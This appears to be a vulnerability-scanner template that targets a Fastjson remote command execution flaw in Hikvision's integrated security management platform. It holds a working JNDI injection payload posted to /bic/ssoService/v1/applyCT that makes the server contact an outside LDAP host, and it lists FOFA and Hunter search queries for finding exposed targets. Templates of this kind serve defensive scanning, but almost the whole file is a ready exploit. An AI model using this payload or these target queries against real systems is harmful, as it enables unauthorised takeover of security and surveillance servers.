id: hikvision-fastjson-rce

info:
  name: ​海康威视综合安防管理平台 Fastjson 远程命令执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |
    海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，直接获取服务器权限。
    fofa: app="HIKVISION-综合安防管理平台"
    fofa: icon_hash="136203464"
    hunter: web.icon="753466eed2bbef2bae18b55994d1d2ae"
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247483899&idx=1&sn=dfd2e5c6abf054c7d8982b20cd9063f4

set:
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /bic/ssoService/v1/applyCT
      headers:
        Content-Type: application/json
      body: |
        {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverseURL}}","autoCommit":true},"hfe4zyyzldp":"="}
    expression: reverse.wait(5)
expression: r0()